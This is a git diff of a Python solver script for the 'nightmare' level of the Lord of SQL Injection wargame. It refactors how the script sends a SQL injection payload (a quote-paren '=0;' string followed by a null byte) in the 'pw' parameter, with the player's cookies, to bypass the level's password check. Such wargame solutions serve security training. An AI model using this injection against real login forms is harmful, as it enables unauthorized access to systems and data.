@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 import los
+import los_cookies as lc
 
 
 def main():
@@ -15,14 +16,16 @@ def main():
     '''
 
     url = "https://los.rubiya.kr/chall/nightmare_be1285a95aa20e8fa154cb977c37fee5.php"
-    cook = los.check_cookies(url)
+    cook = lc.check_cookies(url)
+    method = 'get'
+    inj_param = 'pw'
 
-    param = dict(pw="')=0;" + chr(0))
+    payload = "')=0;" + chr(0)
+    p = los.SqlInjection(url, cook, method, inj_param, payload)
 
-    response = los.get_request(url, param, cook)
-
+    response = p.my_request()
     if 'Clear!' in response:
-        print('Nightmare Clear!')
+        print('\nNightmare Clear!')
 
 
 if __name__ == '__main__':
